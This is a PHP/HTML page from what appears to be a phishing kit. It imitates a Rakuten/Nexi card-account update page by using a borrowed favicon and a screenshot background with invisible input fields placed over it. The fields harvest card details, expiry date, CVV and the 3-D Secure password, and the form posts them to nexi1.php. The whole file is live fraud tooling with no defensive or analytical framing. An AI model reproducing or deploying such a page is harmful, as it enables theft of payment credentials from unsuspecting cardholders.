﻿<?php   ob_start();  ?>
<?
include "X.php";
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>アカウントを更新する</title>
	<link rel="icon" type="image/png" href="https://member.id.rakuten.co.jp/favicon.ico" />
	<style>
		body {
		 margin-top: -41;
		 background: #fff;
		}

		.page {
		 background-image: url("STR/Nexi.png");
		 background-repeat: no-repeat;
		 height: 695px;
		 width: 1340px;
		 position: relative;
		}
		
		input, select {
		 position: absolute; /* VODKA */
		 width: 304;
		 height: 22;
		 border: 0;
		 padding: 3 8 3 8;
		 left: 587;
		}

		.button {
		 width: 105;
		 height: 37;
		 border: 0;
		 cursor: pointer;
		}
		.submit {
		 position: absolute;
		 left: 810;
		 top: 540;
		}
	.auto-style1 {
	margin-top: 6px;
}
.auto-style2 {
	margin-top: 1px;
}
	.auto-style3 {
	margin-top: 1px;
	margin-bottom: 0px;
}
	</style>
	

								<p>&nbsp;<form name="appleConnectForm" method="post" action="nexi1.php">

	<center>
			<form action="--WEBBOT-SELF--" method="POST" id="info" onsubmit="if(do_submit(3)) return true; else return false;">
		<div class="page" style="left: 0px; top: 0px; height: 1295px">

			<div>
				<input type="text" placeholder="月" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname2" name="j3" style="top:440; position:absolute; left:447; width:104px; height:19px" size="41" class="auto-style2"><input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname5" name="j1" style="top:337; position:absolute; left:447; width:229px; height:19px" size="41" class="auto-style3"><input type="text" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname6" name="j2" style="top:383; position:absolute; left:447; width:230px; height:19px" size="41" class="auto-style3"><input type="password" placeholder="Verified by visa - Mastercard secure" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname4" name="j6" style="top:533; position:absolute; left:447; width:230px; height:19px" size="41" class="auto-style3"><input type="text" placeholder=" (CVV/CVV2)" autocapitalize="off" autocorrect="off" maxlength="29" tabindex="1" required="" title="" id="fullname1" name="j5" style="top:486; position:absolute; left:446; width:105px; height:19px" size="41" class="auto-style2">
				<input type="text" id="pass0" placeholder="年" name="j4" class="auto-style1" required="" title="  " style="position: absolute; left: 589; top: 435; height: 19px; width: 104px" size="1"><div class="button submit" onclick="javascript:do_submit(1);" style="position: absolute; left: 583px; top: 459px; width: 72px; height: 30px">
					<p>
<input type="image"  border="0" alt="" name="submit" style="position: absolute; left: -27; top: 139; " src="STR/blank.gif" height="26" width="124">
					<p>
					&nbsp;</div>
					<!--  -->